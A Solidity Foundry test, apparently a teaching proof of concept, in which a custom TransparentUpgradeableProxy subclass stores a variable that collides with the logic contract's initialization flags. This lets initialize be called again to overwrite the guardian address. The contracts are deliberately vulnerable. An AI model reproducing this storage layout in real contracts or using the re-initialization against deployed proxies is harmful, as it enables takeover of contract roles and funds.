pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

interface ILogic {

    function getguardianAddress() external returns (address);

    function getproxyAdmin() external returns (address);

    function initialize(address) external;

    function getinitializing() external returns (bool);

    function getinitialized() external returns (bool);

    function isConstructor() external view returns (bool);
}

contract ContractTest is Test {
    Logic LogicContract;
    TestProxy ProxyContract;

    function testStorageCollision() public {
        LogicContract = new Logic();
        ProxyContract = new TestProxy(
        address(LogicContract),
        address(msg.sender),
        address(this)
    );

    console.log(
    "Current guardianAddress:",
    ILogic(address(ProxyContract)).getguardianAddress()
);
console.log(
"Current initializing boolean:",
ILogic(address(ProxyContract)).getinitializing()
);
console.log(
"Current initialized boolean:",
ILogic(address(ProxyContract)).getinitialized()
);
console.log("Try to call initialize to change guardianAddress");
ILogic(address(ProxyContract)).initialize(address(msg.sender));

console.log(
"After initializing, changed guardianAddress to operator:",
ILogic(address(ProxyContract)).getguardianAddress()
);
console.log(
"After initializing,  initializing boolean is still true:",
ILogic(address(ProxyContract)).getinitializing()
);
console.log(
"After initializing,  initialized boolean:",
ILogic(address(ProxyContract)).getinitialized()
);

console.log("operate completed");
}

receive() external payable {}
}

contract TestProxy is TransparentUpgradeableProxy {
    address private proxyAdmin;

    constructor(
    address _logic,
    address _admin,
    address guardianAddress
)
TransparentUpgradeableProxy(
_logic,
_admin,
abi.encodeWithSelector(
bytes4(0xc4d66de8),
guardianAddress
)
)
{
    proxyAdmin = _admin;
}
}

contract Initializable {
    bool private initialized;

    bool private initializing;

    modifier initializer() {
        require(
        initializing || isConstructor() || !initialized,
        "Contract instance has already been initialized"
    );

    bool isTopLevelCall = !initializing;
    if (isTopLevelCall) {
        initializing = true;
        initialized = true;
    }

    _;

    if (isTopLevelCall) {
        initializing = false;
    }
}

function isConstructor() private view returns (bool) {

    address self = address(this);
    uint256 cs;
    assembly {
        cs := extcodesize(self)
    }
    return cs == 0;
}

uint256[50] private ______gap;

function getinitializing() public view returns (bool) {
    return initializing;
}

function getinitialized() public view returns (bool) {
    return initialized;
}
}

contract Logic is Initializable {
    address private guardianAddress;

    function initialize(address _guardianAddress) public initializer {
        guardianAddress = _guardianAddress;
    }

    function getguardianAddress() public view returns (address) {
        return guardianAddress;
    }
}